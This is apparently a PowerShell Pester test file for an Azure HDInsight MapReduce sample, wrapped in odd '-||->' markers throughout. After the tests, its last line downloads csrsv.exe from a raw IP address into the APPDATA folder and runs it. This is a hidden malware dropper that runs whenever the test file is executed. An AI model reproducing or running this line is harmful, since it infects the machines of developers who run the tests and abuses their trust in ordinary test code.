 -||-> $here =  -||-> Split-Path -Parent $MyInvocation.MyCommand.Path <-||-  <-||- 
 -||-> $sut = ( -||-> Split-Path -Leaf $MyInvocation.MyCommand.Path <-||- ) -replace '\.Tests', '' <-||- 
 -||-> . "$here\$sut" <-||- 

 -||-> $clusterName = $ENV:ClusterName <-||- 
 -||-> $httpUserPassword = $ENV:HttpPassword <-||- 
 -||-> $securePassword =  -||-> ConvertTo-SecureString $httpUserPassword -AsPlainText -Force <-||-  <-||- 
 -||-> $creds =  -||-> New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "admin", $securePassword <-||-  <-||- 



 -||-> function Get-Credential { return  -||-> $creds <-||-  } <-||- 

 -||-> Describe "hdinsight-hadoop-use-mapreduce-powershell" {
    
     -||-> in $TestDrive {
         -||-> It "Runs a MapReduce job using Start-AzHDInsightJob" {
             -||-> Mock Read-host {  -||-> $clusterName <-||-  } <-||- 
            
             -||-> ( -||-> Start-MapReduce <-||- )[0].State | Should be "SUCCEEDED" <-||- 
        } <-||- 
         -||-> It "Downloaded the output file" {
             -||-> Test-Path .\output.txt | Should be True <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



